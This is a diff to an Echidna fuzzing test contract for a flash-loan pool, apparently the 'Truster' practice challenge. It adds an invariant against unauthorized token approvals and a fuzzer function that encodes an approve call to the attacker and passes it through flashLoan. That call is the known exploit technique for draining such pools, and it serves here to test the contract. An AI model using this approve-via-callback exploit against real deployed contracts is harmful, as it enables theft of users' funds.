@@ -21,13 +21,15 @@ contract TrusterEchidna {
         token.mint(attacker, 1000e18);
     }
 
+    // Invariant: No unauthorized approvals
     function echidna_no_unauthorized_approvals() public view returns (bool) {
-        // TODO: Implement the invariant
-        return true;
+        return token.allowance(address(pool), attacker) == 0;
     }
 
+    // Fuzzer function
     function attemptApprovalExploit(uint256 amount) public {
-        // TODO: Implement the fuzzer function
-        return;
+        if (amount == 0 || amount > token.balanceOf(address(pool))) return;
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, amount);
+        try pool.flashLoan(0, attacker, address(token), data) {} catch {}
     }
 }
